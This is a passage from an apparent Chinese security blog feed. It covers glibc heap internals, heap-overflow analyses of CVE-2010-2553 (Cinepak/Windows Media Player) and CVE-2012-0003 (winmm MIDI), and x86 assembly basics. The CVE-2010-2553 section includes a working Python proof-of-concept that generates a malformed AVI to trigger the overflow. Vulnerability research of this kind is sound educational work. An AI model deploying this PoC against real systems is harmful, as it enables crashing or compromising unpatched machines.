大小都一致。比如对于 32 位系统来说，下标 2 对应的双向链表中存储的 chunk 大小为均为 16 字节。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</p><h3 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h3><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致</p><table><thead><tr><th style="text-align:left">组</th><th style="text-align:left">数量</th><th style="text-align:left">公差</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">32</td><td style="text-align:left">64B</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">16</td><td style="text-align:left">512B</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">8</td><td style="text-align:left">4096B</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">4</td><td style="text-align:left">32768B</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">2</td><td style="text-align:left">262144B</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">1</td><td style="text-align:left">不限制</td></tr></tbody></table><h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p><h2 id="堆的基本实现功能"><a href="#堆的基本实现功能" class="headerlink" title="堆的基本实现功能"></a>堆的基本实现功能</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来。</p><p>基本原理：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">定义三个堆块 A-P-C用双链表连接，现在要取出P</span><br><span class="line"></span><br><span class="line">FD = P-&gt;fd;  //定义P的前驱</span><br><span class="line">BK = P-&gt;bk;  //定义P的后继</span><br><span class="line">FD-&gt;bk = A; //令P的后继节点的前驱为A</span><br><span class="line">BK-&gt;fd = C; //令P的前驱节点的后继为C</span><br><span class="line"></span><br><span class="line">合并一下其实就是如下关系</span><br><span class="line">P-&gt;fd-&gt;bk = A</span><br><span class="line">P-&gt;bk-&gt;fd = C</span><br><span class="line"></span><br><span class="line">最后结果</span><br><span class="line">A-C   P取出</span><br></pre></td></tr></table></figure><p>unlink可能在以下地方使用：</p><ul><li><p>malloc</p><ul><li>从恰好大小合适的 large bin 中获取 chunk。<ul><li><strong>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</strong></li><li>依次遍历处理 unsorted bin 时也没有使用 unlink 。</li></ul></li><li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。</li></ul></li><li><p>free</p><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><p>malloc_consolidate</p><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><p>realloc</p><ul><li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li></ul><p>unlink操作后，<strong>P 本身的 fd 和 bk 指针并没有发生变化</strong>，有时候可以使用这个方法来泄漏地址</p><ul><li>libc 地址<ul><li>P 位于双向链表头部，bk 泄漏</li><li>P 位于双向链表尾部，fd 泄漏</li><li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏</li></ul></li><li><p>泄漏堆地址，双向链表包含多个空闲 chunk</p><ul><li>P 位于双向链表头部，fd 泄漏</li><li>P 位于双向链表中，fd 和 bk 均可以泄漏</li><li>P 位于双向链表尾部，bk 泄漏</li></ul></li><li><p>这里的头部指的是 bin 的 fd 指向的 chunk，即双向链表中最新加入的 chunk。</p></li><li>这里的尾部指的是 bin 的 bk 指向的 chunk，即双向链表中最先加入的 chunk。</li></ul><h3 id="malloc-printerr"><a href="#malloc-printerr" class="headerlink" title="malloc_printerr"></a>malloc_printerr</h3><p>在 glibc malloc 时检测到错误的时候，会调用 <code>malloc_printerr</code> 函数。<br>       主要会调用 <code>__libc_message</code> 来执行<code>abort</code> 函数。<br>       在<code>abort</code> 函数里，在 glibc 还是 2.23 版本时，会 fflush stream。</p><h3 id="堆初始化"><a href="#堆初始化" class="headerlink" title="堆初始化"></a>堆初始化</h3><p>堆初始化是在用户第一次申请内存时执行 malloc_consolidate 再执行 malloc_init_state 实现的。</p><h3 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h3><p>一般我们会使用 malloc 函数来申请内存块，其实该函数真正调用的是 <strong>libc_malloc 函数。此外，</strong>libc_malloc 函数只是用来简单封装 _int_malloc 函数。_int_malloc 才是申请内存块的核心。</p><p>需要了解的时候查<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc-zh/" target="_blank" rel="noopener">ctf-wiki</a>就好，释放内存块类似</p><p>From <a href="https://kabeor.github.io/堆溢出-Glibc堆结构/">https://kabeor.github.io/堆溢出-Glibc堆结构/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Glibc堆结构&quot;&gt;&lt;a href=&quot;#堆溢出-Glibc堆结构&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Glibc堆结构&quot;&gt;&lt;/a&gt;堆溢出-Glibc堆结构&lt;/h1&gt;&lt;p&gt;目前堆实现有如下几种&lt;/p&gt;
&lt;figure class=&quot;
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2553 CVDecompress堆溢出分析</title>
    <link href="https://kabeor.github.io/CVE-2010-2553%20CVDecompress%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/</id>
    <published>2019-12-31T09:10:27.505Z</published>
    <updated>2019-12-31T09:10:58.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2010-2553-CVDecompress堆溢出分析"><a href="#CVE-2010-2553-CVDecompress堆溢出分析" class="headerlink" title="CVE-2010-2553 CVDecompress堆溢出分析"></a>CVE-2010-2553 CVDecompress堆溢出分析</h1><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><blockquote><p>Windows XP SP3 x86<br>Windbg 6.12.2.633<br>Windows Media Player 9.0.0.4503</p></blockquote><h3 id="Windbg符号表配置"><a href="#Windbg符号表配置" class="headerlink" title="Windbg符号表配置"></a>Windbg符号表配置</h3><p><img src="https://i.loli.net/2019/12/28/QHNyEZL9nvK7itO.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srv*c:\Symbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><p>微软Win7以后使用在线下载符号表机制，XP没有支持，所以只能从网上下载符号表离线包，但还是有些报错，可以复制报错路径，在c:\Symbols中创建该路径，然后将对应dll(C:\WINDOWS\Symbols\dll中)复制过来，如图<br><img src="https://i.loli.net/2019/12/28/q82lfNQ7aLEvsdP.png" alt></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>运行Media Player，windbg附加wmplayer.exe</p><h3 id="定位漏洞位置"><a href="#定位漏洞位置" class="headerlink" title="定位漏洞位置"></a>定位漏洞位置</h3><p>windbg下的gflags.exe可以辅助堆调试<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">调试选项</span><br><span class="line"></span><br><span class="line">htc-堆尾检查，在堆块末尾附加额外的标记信息（通常为8字节），用于检查堆块是否发生溢出。</span><br><span class="line">hfc-堆释放检查，在释放堆块时对堆进行各种检查，防止多次释放同一个堆块。</span><br><span class="line">hpc-堆参数检查，对传递给堆管理的参数进行更多的检查。</span><br><span class="line">ust-用户态栈回溯，即将每次调用堆函数的函数调用信息记录到一个数据库中。</span><br><span class="line">htg-堆标志，为堆块增加附加标记，以记录堆块的使用情况或其他信息。</span><br><span class="line">hvc-调用时验证，即每次调用堆函数时都对整个堆进行验证和检查。</span><br><span class="line">hpa-启用页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</span><br></pre></td></tr></table></figure></p><p>windbg中使用!gflag +hpa启用页堆检测<br>g继续运行程序，运行poc.avi<br>触发异常，kb显示调用栈<br><img src="https://i.loli.net/2019/12/28/wegijKQWNkElnHI.png" alt></p><p>ub查看反汇编，进入73b721ae产生异常，因此在73b7cbee处下断点<br><img src="https://i.loli.net/2019/12/28/mhGurxMwElo9YQd.png" alt></p><p>但如果直接下断点到73b7cbee不成功，因为该地址位于iccvid.dll模块中，而iccvid只在解析poc.avi时才会被动态加载，若重新附加进程运行，里面是没有iccvid.dl模块的。</p><p><strong>解决方法：在刚刚附加上进程时，通过”sxe ld:iccvid”命令，设置在iccvid.dll模块首次加载时断下</strong></p><p>重新加载，使用sxe ld:iccvid加载iccvid.dll模块并断下,g继续运行<br>播放poc.avi, lmm iccvid查看模块信息<br>bp下断<br>bl可看出模块列表<br>运行即可到达该断点位置</p><p><img src="https://i.loli.net/2019/12/28/DQUTP4BYCsOkHXx.png" alt></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>IDA分析iccvid.dll,并导入pdb，发现该漏洞位于__stdcall CVDecompress(x, x, x, x, x, x, x)函数中</p><p><img src="https://i.loli.net/2019/12/28/DWwT4rHdMLzCUO5.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B721E1 loc_73B721E1:                           <span class="comment">; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15↑j</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E1                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E3                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E7                 <span class="keyword">jb</span>      loc_73B723ED</span><br><span class="line"><span class="symbol">.text:</span>73B721ED                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>73B721F0                 <span class="keyword">mov</span>     <span class="number">ah</span>, [<span class="built_in">esi</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721F3                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721F7                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">esi</span>+<span class="number">2</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721FA                 <span class="keyword">shl</span>     <span class="built_in">eax</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>73B721FD                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>73B721FF                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72202                 <span class="keyword">jl</span>      loc_73B723F4</span><br><span class="line"><span class="symbol">.text:</span>73B72208                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">esi</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B7220A                 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_8+<span class="number">3</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">.text:</span>73B7220D                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span>73B72210                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>73B72211                 <span class="keyword">push</span>    <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>73B72213                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72214                 <span class="keyword">call</span>    _ULongSub@<span class="number">12</span>    <span class="comment">; ULongSub(x,x,x)</span></span><br><span class="line"><span class="symbol">.text:</span>73B72219                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B7221B                 <span class="keyword">jl</span>      loc_73B723F4</span><br><span class="line"><span class="symbol">.text:</span>73B72221                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72223                 <span class="keyword">mov</span>     <span class="number">ah</span>, [<span class="built_in">esi</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B72226                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>73B72229                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_14], <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>73B7222C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_18], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>73B7222F                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>73B72232                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">esi</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B72235                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>73B72237                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B7223A                 <span class="keyword">jle</span>     loc_73B723EA</span><br><span class="line"><span class="symbol">.text:</span>73B72240                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">edi</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/vjZzI4Kbo7JH9qh.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cinepak_codec_data1 = &apos;\x00\x00\x00\x68\x01\x60\x01\x20&apos;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/27fA1yahwgdWtRu.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B72226                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">0Ah</span>  <span class="comment">;esi指向cinepak_codec_data2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></span><br></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B72246                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">16h</span>  <span class="comment">;判断未解压缩数据是否大于等于0x16</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>73B722A9                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]  <span class="comment">;首次为0，循环递增到0x2000</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/dzRLiMa4jB6PqcH.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B723B9 loc_73B723B9:                           <span class="comment">; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15A↑j</span></span><br><span class="line"><span class="symbol">.text:</span>73B723B9                 <span class="keyword">movsx</span>   <span class="built_in">eax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>73B723BD                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_18]</span><br><span class="line"><span class="symbol">.text:</span>73B723C1                 <span class="keyword">add</span>     [<span class="built_in">ebp</span>+arg_14], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B723C4                 <span class="keyword">inc</span>     [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span>73B723C7                 <span class="keyword">add</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">2000h</span></span><br><span class="line"><span class="symbol">.text:</span>73B723CE                 <span class="keyword">xor</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span></span><br></pre></td></tr></table></figure><p>每次循环复制0x800字节数据，目标地址递增0x2000，堆块大小为0x6000，令0x1100的数据块超过三个就能造成堆溢出。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">aviHeaders = <span class="string">'\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">padding = <span class="string">'\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'</span></span><br><span class="line">movi_tag = <span class="string">'\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'</span></span><br><span class="line">cinepak_codec_data1 = <span class="string">'\x00\x00\x00\x68\x01\x60\x01\x20'</span></span><br><span class="line">number_of_coded_strips = <span class="string">'\x00\x10'</span> </span><br><span class="line">cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></span><br><span class="line">idx_tag = <span class="string">'\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'</span></span><br><span class="line"></span><br><span class="line">avifile = open(<span class="string">'poc.avi'</span>, <span class="string">'wb+'</span>)</span><br><span class="line">avifile.write(aviHeaders)</span><br><span class="line">avifile.write(padding)</span><br><span class="line">avifile.write(movi_tag)</span><br><span class="line">avifile.write(cinepak_codec_data1)</span><br><span class="line">avifile.write(number_of_coded_strips)</span><br><span class="line">avifile.write(cinepak_codec_data2)</span><br><span class="line">avifile.write(idx_tag)</span><br><span class="line"></span><br><span class="line">avifile.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] AVI file generated'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/">https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2010-2553-CVDecompress堆溢出分析&quot;&gt;&lt;a href=&quot;#CVE-2010-2553-CVDecompress堆溢出分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2010-2553 CVDecompress堆溢出分
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2012-0003 MIDI 文件堆溢出分析</title>
    <link href="https://kabeor.github.io/CVE-2012-0003%20MIDI%20%E6%96%87%E4%BB%B6%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出分析/</id>
    <published>2019-12-31T09:10:27.504Z</published>
    <updated>2019-12-31T09:17:18.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2012-0003-MIDI-文件堆溢出分析"><a href="#CVE-2012-0003-MIDI-文件堆溢出分析" class="headerlink" title="CVE-2012-0003 MIDI 文件堆溢出分析"></a>CVE-2012-0003 MIDI 文件堆溢出分析</h1><p>该漏洞成因主要是由于 winmm.dll 动态链接库在处理 MIDI 文件的 Note On 和 Note Off 字段没有做限制，导致可以操纵该字段访问堆块之外 1 个字节的内存空间；由于该漏洞过于特殊，所以在分析和利用的时候难度是相当大的。</p><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><blockquote><p>Windows XP SP3 x86<br>Windbg 6.12.2.633<br>IE6   wnimm.dll</p></blockquote><h2 id="MIDI-文件格式"><a href="#MIDI-文件格式" class="headerlink" title="MIDI 文件格式"></a>MIDI 文件格式</h2><p>MIDI 全称 Musical Instrument Digital Interface，是一种乐器数字接口（通过winmm.dll 链接库解析这种格式的文件之后可以播放出音乐）</p><p>总体来说 MIDI 可分为 “头块” 和若干多的 “音轨块”<br><img src="https://i.loli.net/2019/12/28/ACdeJFDR8tj9B6Y.png" alt></p><p>头块结构如下<br><img src="https://i.loli.net/2019/12/28/rpXTb2B1h4KeZED.png" alt></p><p>音轨事件如下<br><img src="https://i.loli.net/2019/12/28/wZozQXrlI1NOFmY.png" alt></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>poc.html 样本中嵌入了一个音频播放器，由音频播放器来调用 toto.mid 文件播放音频从而触发漏洞</p><p>如果先运行windbg设置堆溢出检测标志，当前IE进程将无法运行poc，需要在命令行先设置gflag再运行windbg。</p><p><img src="https://i.loli.net/2019/12/28/ZKg4o5QFxMaGlkm.png" alt></p><p>F5 运行之后将 poc.html 文件拖入 IE，并且允许运行 ActiveX 控件<br>断下异常，可以看出 esi 指向的地址超出了堆空间，之后被堆页保护捕捉到<br><img src="https://i.loli.net/2019/12/28/C1SEImayw3O2QZV.png" alt></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="https://i.loli.net/2019/12/28/BypUiQqwgMhOVZ4.png" alt></p><p><img src="https://i.loli.net/2019/12/28/ZEVQ5P4FBgkUYJH.png" alt></p><p>shift + F4 对 v2、v9、v11、v13、v21、v23 和 v20 下条件记录断点，记录表达数值<br>v20 int3断点<br>运行poc后查看日志</p><p>分析看出 v11、v13、v21 相等<br>v2 不变，v20 最后才被记录，且指向的地址都在 0x07EC0000 往后的堆中<br>v23 的值，也就是 0x007DB29F 是来自漏洞样本的数据，结合MIDI 格式分析可以知道，9F 代表的就是打开音符（Note On），F 就是通道号</p><p>通道号 F 经过计算之后值为 419，控制着指针的偏移地址，也就是 v24 的值<br>v20 由传入的参数 wParam 控制，midiOutTimerTick函数调用了 midiOutPlayNextPolyEvent 函数，并且把 v6 当作参数传入，而 v6 = gpEmuList，gpEmuList在mseOpen 函数中被引用<br><img src="https://i.loli.net/2019/12/28/BzQLi83RXwCcbZM.png" alt></p><p>最后分析出v20=v6,因为 v6 是堆块的基地址，且这个堆块的大小为 0x400，所以 v20 也为这个 0x400 堆块的基地址</p><p>v25 的指针由 v24 和 v20 相加得出，v20 是堆的基址，而 v24 是样本数据解析运算获得，由于没有限制通道号的大小，导致运算后的偏移地址 v24 为 419，可是堆只有 0x400大小，很显然超出了申请的堆空间，照成了非法访问，故引发了堆页保护异常</p><p>From <a href="https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出分析/">https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出分析/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2012-0003-MIDI-文件堆溢出分析&quot;&gt;&lt;a href=&quot;#CVE-2012-0003-MIDI-文件堆溢出分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2012-0003 MIDI 文件堆溢出分析&quot;&gt;&lt;/a&gt;CVE-2012
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编-从实模式到保护模式</title>
    <link href="https://kabeor.github.io/x86%E6%B1%87%E7%BC%96%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    <id>https://kabeor.github.io/x86汇编从实模式到保护模式/</id>
    <published>2019-12-31T09:10:04.109Z</published>
    <updated>2019-12-31T09:10:58.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x86汇编-从实模式到保护模式"><a href="#x86汇编-从实模式到保护模式" class="headerlink" title="x86汇编-从实模式到保护模式"></a>x86汇编-从实模式到保护模式</h1><blockquote><p>注释</p></blockquote><p>注释必须以分号“;”开始。</p><blockquote><p>在屏幕上显示文字</p></blockquote><p>文本模式和图形模式是显卡的两种基本工作模式，可以用指令访问显卡，设置它的显示模式。在不同的工作模式下，显卡对显存内容的解释是不同的。</p><p>为了访问显存，也需要使用逻辑地址，也就是采用“段地址：偏移地址”的形式</p><p>Intel的处理器不允许将一个立即数传送到段寄存器，它只允许这样的指令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov 段寄存器，通用寄存器 </span><br><span class="line">mov 段寄存器，内存单元</span><br><span class="line"></span><br><span class="line">         mov ax,0xb800                 ;指向文本模式的显示缓冲区</span><br><span class="line">         mov es,ax</span><br></pre></td></tr></table></figure><blockquote><p>显示字符</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov byte [es:0x00],&apos;L&apos;</span><br><span class="line">mov byte [es:0x01],0x07          ;将属性值0x07传送到下一个内存单元</span><br><span class="line">mov byte [es:0x02],&apos;a&apos;</span><br><span class="line">mov byte [es:0x03],0x07</span><br><span class="line">mov byte [es:0x04],&apos;b&apos;</span><br><span class="line">mov byte [es:0x05],0x07</span><br></pre></td></tr></table></figure><blockquote><p>显示标号的汇编地址</p></blockquote><p>asm编译后，除了生成一个以“.bin”为扩展名的二进制文件，还会生成一个以“.lst”为扩展名的列表文件。这张表列出编译后生成的列表文件内容。</p><p>在编译阶段，每条指令都被计算并赋予了一个汇编地址，就像它们已经被加载到内存中的某个段里一样。实际上，当编译好的程序加载到物理内存后，它在段内的偏移地址和它在编译阶段的汇编地址是相等的。</p><p>源程序的编译是从上往下的，而内存地址的增长是从下往上的（从低地址往高地址方向增长）。</p><blockquote><p>loop</p></blockquote><p>loop指令的功能是重复执行一段相同的代码，处理器在执行它的时候会顺序做两件事： <strong>将寄存器CX的内容减一； 如果CX的内容不为零，转移到指定的位置处执行，否则顺序执行后面的指令。</strong></p><blockquote><p>计算1到100的和</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    xor ax,ax</span><br><span class="line">    mov cx,1</span><br><span class="line">@f:</span><br><span class="line">    add ax,cx</span><br><span class="line">    inc cx</span><br><span class="line">    cmp cx,100</span><br><span class="line">    jle @f</span><br></pre></td></tr></table></figure><blockquote><p>分段、段的汇编地址和段内汇编地址</p></blockquote><figure class="highlight plain"><table><tr><td 